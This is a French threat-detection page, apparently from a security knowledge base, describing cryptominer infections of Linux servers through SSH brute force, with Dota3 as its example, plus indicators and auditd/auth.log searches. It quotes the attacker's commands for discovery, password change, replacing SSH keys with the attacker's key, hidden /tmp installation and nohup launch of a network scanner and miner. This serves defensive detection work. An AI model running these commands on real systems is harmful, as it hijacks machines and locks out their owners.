---
title: "Minage de cryptomonnaie"
description: "L'attaquant installe un mineur sur un serveur Linux compromis pour faire tourner son processeur à son profit : l'issue la plus courante des attaques de masse."
tags: [linux, cryptominer, xmrig, ssh, auditd]
updated: 2026-11-19
draft: false
type: technique
attack_id: T1496
tactic: impact
severity: high
platforms: [Linux]
data_sources: [auth.log, auditd, Capture réseau]
related:
  - 03-menaces-detection/credential-access/force-brute
  - 03-menaces-detection/command-and-control/telechargement-d-outils
---

## Description

Beaucoup d'attaques sur Linux visent un gain rapide, en masse (« Hack and Forget ») : un groupe balaie Internet à la recherche de SSH exposés avec un mot de passe faible, et fait quelques victimes chaque mois. Après une découverte rapide, l'attaque finit d'une de ces trois façons, ou des trois à la fois :

- **Mineur de cryptomonnaie** : le processeur ou la carte graphique de la victime mine au profit de l'attaquant.
- **Botnet** (Mirai par exemple) : la victime sert à d'autres attaques, comme des dénis de service.
- **Relais** : la victime envoie du phishing, héberge des malwares ou fait transiter le trafic de l'attaquant.

## Ce qu'on observe

Exemple réel : **Dota3**, un malware simple qui infecte encore de nombreux systèmes.

:::etapes
1. **Accès initial**
   Un botnet de plus de 2 000 IP dans 94 pays cherche les SSH ouverts et force surtout `root` avec les 1 000 mots de passe faibles les plus courants. Quand un mot de passe est trouvé, une machine du botnet se connecte en SSH.
2. **Découverte**
   Une rafale de commandes automatisées. Les trois premières (processeur, mémoire) suffisent à soupçonner un mineur : peu d'autres malwares en ont besoin.
3. **Persistance**
   Le mot de passe du compte est changé (pour le garder face aux botnets concurrents), et toutes les clés SSH sont remplacées par celle de l'attaquant, ce qui bloque le propriétaire.
4. **Transfert des outils**
   L'archive est envoyée par `scp` depuis une machine du botnet, avec le nouveau mot de passe.
5. **Installation**
   Décompression dans un dossier caché de `/tmp`, nommé comme un logiciel légitime pour décourager l'équipe informatique.
6. **Exécution**
   Un scanner SSH du réseau interne pour trouver d'autres victimes, puis le mineur XMRig, tous deux lancés avec `nohup` pour survivre à la fermeture de la session SSH.
:::

```bash title="découverte : processeur, mémoire, puis commandes génériques"
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
ls -lh $(which ls)
crontab -l
w
uname -m
```

```bash title="persistance : nouveau mot de passe, clé SSH de l'attaquant"
`echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash` >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```

```bash title="installation dans un dossier caché de /tmp, puis exécution"
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
tar xf dota3.tar.gz
cd /tmp/.X26-unix/.rsync/c
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
```

Indicateurs :

| Source | Ce qui alerte |
| --- | --- |
| auth.log | Connexion SSH réussie par mot de passe depuis une IP externe non fiable, connue comme malveillante. |
| auditd | Rafale de commandes de découverte (`uname`, `lscpu`) ; fichiers et dossiers cachés créés dans `/tmp` ; fichiers au nom de malware connu (`dota3.tar.gz`) ; commandes fréquentes dans les attaques comme `nohup`. |
| Réseau | Balayage du port SSH sur des réseaux entiers (`192.168.*`, `172.16.*`). |
| EDR | Le binaire XMRig, bloqué par la plupart des EDR. |
| SIEM | La chaîne `mdrfckr`, propre à cette attaque, dans la clé SSH. |

## Détection

### auth.log

```bash title="connexions SSH réussies"
cat /var/log/auth.log | grep "Accepted"
```

Chercher les connexions par mot de passe depuis des IP externes non fiables : voir [force brute](../credential-access/force-brute.md).

### auditd

```bash title="un journal auditd récupéré dans un fichier"
ausearch -i -if /chemin/audit.log
```

```bash title="les lancements d'une commande de découverte"
ausearch -i -x lscpu
```

Remonter l'origine des commandes : [arbre des processus](../../01-fondamentaux/journaux-linux.md#remonter-larbre-des-processus).

## Faux positifs

À compléter.

## Réponse

À compléter.
